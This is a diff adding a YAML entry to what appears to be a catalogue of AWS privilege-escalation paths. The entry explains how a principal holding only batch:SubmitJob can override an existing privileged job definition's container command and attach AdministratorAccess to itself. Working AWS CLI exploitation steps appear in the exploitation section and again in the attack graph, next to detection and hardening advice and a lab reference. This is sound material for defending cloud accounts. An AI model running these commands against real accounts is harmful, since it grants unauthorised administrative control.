@@ -1,0 +1,200 @@
+id: batch-002
+name: batch:SubmitJob
+category: existing-passrole
+services:
+  - iam
+  - batch
+
+permissions:
+  required:
+    - permission: batch:SubmitJob
+      resourceConstraints: No resource constraints required; must be able to submit to the target job queue
+  additional:
+    - permission: batch:DescribeJobDefinitions
+      resourceConstraints: Helpful for discovering job definitions that carry privileged jobRoleArns
+    - permission: batch:DescribeJobQueues
+      resourceConstraints: Helpful for discovering available job queues
+    - permission: batch:DescribeJobs
+      resourceConstraints: Useful for polling job execution status
+    - permission: batch:DescribeComputeEnvironments
+      resourceConstraints: Helpful for understanding the compute environment configuration
+
+description: A principal with only `batch:SubmitJob` can escalate privileges by submitting a job to an existing Batch job queue using a pre-existing job definition that already has an admin `jobRoleArn`. The `ContainerOverrides.Command` field allows the submitter to replace the container's default command with any arbitrary command — including `iam:AttachUserPolicy` — which executes using the job definition's admin role credentials. No `iam:PassRole` or `batch:RegisterJobDefinition` is required because the privileged role was already assigned to the existing job definition.
+
+prerequisites:
+  admin:
+    - An existing Batch job definition must already have an admin IAM role set as the jobRoleArn
+    - An existing Batch job queue must be available to submit jobs to
+  lateral:
+    - An existing Batch job definition must have an elevated IAM role set as the jobRoleArn
+    - An existing Batch job queue must be available
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        aws batch describe-job-definitions \
+          --status ACTIVE \
+          --query 'jobDefinitions[*].{name:jobDefinitionName,role:containerProperties.jobRoleArn}' \
+          --output table
+      description: Enumerate existing active Batch job definitions to identify ones with privileged jobRoleArns attached.
+    - step: 2
+      command: |
+        aws batch submit-job \
+          --job-name privesc-override-job \
+          --job-queue JOB_QUEUE_NAME \
+          --job-definition PRIVILEGED_JOB_DEFINITION \
+          --container-overrides '{
+            "command": [
+              "iam", "attach-user-policy",
+              "--user-name", "STARTING_USER",
+              "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
+            ]
+          }'
+      description: Submit a job using the existing privileged job definition, overriding the container command via ContainerOverrides.Command to attach AdministratorAccess to the starting user. The container runs with the job definition's admin role credentials.
+    - step: 3
+      command: |
+        aws batch describe-jobs \
+          --jobs JOB_ID \
+          --query 'jobs[0].status' \
+          --output text
+      description: Poll job status until it reaches SUCCEEDED, indicating the privilege escalation command has executed.
+    - step: 4
+      command: |
+        aws iam list-attached-user-policies \
+          --user-name STARTING_USER
+      description: Verify that AdministratorAccess is now attached to the starting user.
+
+recommendation: |
+  - **Restrict `batch:SubmitJob`** - This is the core attack permission. Only trusted principals that have a legitimate need to trigger Batch workloads should have this permission. Even without `iam:PassRole`, job submission is a powerful action when privileged job definitions exist.
+  - **Audit existing job definitions for privileged roles** - Regularly review all active Batch job definitions and remove or down-scope any that carry administrative jobRoleArns. A job definition with an admin role is a persistent escalation vector for anyone with `batch:SubmitJob`.
+  - **Use `batch:SubmitJob` conditions** - Restrict which job queues and job definitions a principal can submit to using IAM resource conditions on the `batch:SubmitJob` permission.
+  - Monitor CloudTrail for Batch job submissions where the `ContainerOverrides` field modifies the container command, especially by principals who don't normally submit jobs
+  - Monitor CloudTrail for Batch job submissions using job definitions with privileged roles
+  - Alert on IAM policy attachment events (`iam:AttachUserPolicy`, `iam:AttachRolePolicy`) originating from Batch job execution roles
+  - Regularly audit Batch job definitions for excessive IAM permissions on the `jobRoleArn`
+
+discoveryAttribution:
+  firstDocumented:
+    author: Zander Mackie
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by AWS Batch - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_awsbatch.html"
+  - title: "Messing Around With AWS Batch For Privilege Escalations - Doyensec"
+    url: "https://blog.doyensec.com/2023/06/13/messing-around-with-aws-batch-for-privilege-escalations.html"
+  - title: "How AWS Batch works with IAM - AWS Batch"
+    url: "https://docs.aws.amazon.com/batch/latest/userguide/security_iam_service-with-iam.html"
+
+relatedPaths:
+  - batch-001
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/batch-002-batch-submitjob"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with only `batch:SubmitJob` permission. No `iam:PassRole` or `batch:RegisterJobDefinition` is required. The attacker exploits a pre-existing Batch job definition that already has a privileged `jobRoleArn` assigned, and uses `ContainerOverrides.Command` to replace the default container command with a malicious one.
+
+    - id: existing_job_def
+      label: Existing Job Definition (admin jobRoleArn)
+      type: resource
+      description: |
+        A pre-existing AWS Batch job definition that already has an admin IAM role assigned as the `jobRoleArn`. This is a persistent misconfiguration — any principal with `batch:SubmitJob` access to the associated queue can submit jobs using this definition and override the container command. The privileged role was passed at definition creation time (likely by someone with `iam:PassRole`), so it doesn't need to be re-passed at submission time.
+
+        The attacker first enumerates active job definitions to find ones with privileged roles:
+        ```bash
+        aws batch describe-job-definitions \
+          --status ACTIVE \
+          --query 'jobDefinitions[*].{name:jobDefinitionName,role:containerProperties.jobRoleArn}' \
+          --output table
+        ```
+
+    - id: admin_role
+      label: Admin Role (pre-existing jobRoleArn)
+      type: principal
+      description: The IAM role already assigned to the existing job definition as the `jobRoleArn`. Because this role was configured at definition creation time, the submitter does not need `iam:PassRole` to exploit it. When a container is launched from this definition, it automatically assumes this role. The outcome of the attack depends entirely on the permissions this role has.
+
+    - id: batch_container
+      label: Fargate Container
+      type: resource
+      description: The AWS Batch Fargate container launched when the attacker submits the job. The container inherits the `jobRoleArn` from the existing job definition and executes the attacker-supplied command from `ContainerOverrides.Command`. This overridden command runs with the admin role's temporary credentials, enabling the attacker to perform privileged actions.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: The admin role has AdministratorAccess or includes `iam:AttachUserPolicy`. The overridden container command successfully attaches AdministratorAccess to the starting user, granting full administrative access to the AWS account.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: The role has elevated but non-admin permissions. The container can leverage those permissions for data access, lateral movement, or further escalation attempts. However, the direct IAM escalation command will fail if `iam:AttachUserPolicy` is not included in the role's permissions.
+
+    - id: no_perms
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: The role only has minimal permissions. The overridden container command fails or has no meaningful impact. No privilege escalation is achieved through this path.
+
+  edges:
+    - from: start
+      to: existing_job_def
+      label: batch:SubmitJob (ContainerOverrides.Command)
+      description: |
+        Submit a job to the existing privileged job definition, overriding the container command via `ContainerOverrides.Command`. The `batch:SubmitJob` permission alone is sufficient — no `iam:PassRole` is needed because the privileged role is already embedded in the job definition.
+
+        Command:
+        ```bash
+        aws batch submit-job \
+          --job-name privesc-override-job \
+          --job-queue JOB_QUEUE_NAME \
+          --job-definition PRIVILEGED_JOB_DEFINITION \
+          --container-overrides '{
+            "command": [
+              "iam", "attach-user-policy",
+              "--user-name", "STARTING_USER",
+              "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
+            ]
+          }'
+        ```
+
+    - from: existing_job_def
+      to: admin_role
+      label: Container starts with admin role
+      description: The job definition already has the admin IAM role set as the `jobRoleArn`. When a container is launched from this definition, it automatically assumes that role regardless of who submitted the job or what command they overrode. The role credentials are injected into the container environment.
+
+    - from: admin_role
+      to: batch_container
+      label: Container uses pre-existing jobRoleArn
+      description: The Fargate container runs with the temporary credentials of the pre-existing admin role. These credentials are automatically available in the container environment. The container executes the attacker-supplied command from `ContainerOverrides.Command` using those credentials.
+
+    - from: batch_container
+      to: admin
+      label: If role has admin permissions
+      branch: A
+      condition: admin
+      description: If the pre-existing role has AdministratorAccess or includes `iam:AttachUserPolicy`, the overridden container command successfully attaches AdministratorAccess to the starting user, achieving full privilege escalation.
+
+    - from: batch_container
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the role has elevated but non-admin permissions, the container can use those permissions for data access or further attacks. The direct IAM escalation attempt will fail, but other valuable actions may be possible depending on the role's policies.
+
+    - from: batch_container
+      to: no_perms
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the role only has minimal permissions, the overridden command fails and no meaningful privilege escalation is achieved. The attacker gains no additional access beyond their existing permissions.
